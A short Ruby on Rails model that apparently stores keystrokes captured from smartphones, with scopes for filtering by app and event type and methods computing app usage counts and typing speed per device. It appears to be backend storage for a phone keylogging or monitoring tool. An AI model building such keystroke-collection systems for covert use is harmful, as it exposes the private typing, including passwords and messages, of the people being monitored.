class Keylog < ApplicationRecord
  include Paginatable

  belongs_to :smartphone, counter_cache: true

  validates :keystroke, presence: true

  scope :by_app, ->(app) { where(app_package: app) }
  scope :by_type, ->(type) { where(event_type: type) }
  scope :recent, -> { order(client_timestamp: :desc) }
  scope :today, -> { where('created_at >= ?', Time.current.beginning_of_day) }

  # Get app usage statistics
  def self.app_stats
    group(:app_package).count.sort_by { |_, v| -v }
  end

  # Get typing speed (characters per minute)
  def self.typing_speed(device_id, minutes = 5)
    recent_logs = where(device_id: device_id)
                    .where('created_at >= ?', minutes.minutes.ago)
                    .where(event_type: 'TEXT_CHANGED')
    
    chars = recent_logs.sum('LENGTH(keystroke)')
    (chars.to_f / minutes).round(1)
  end
end
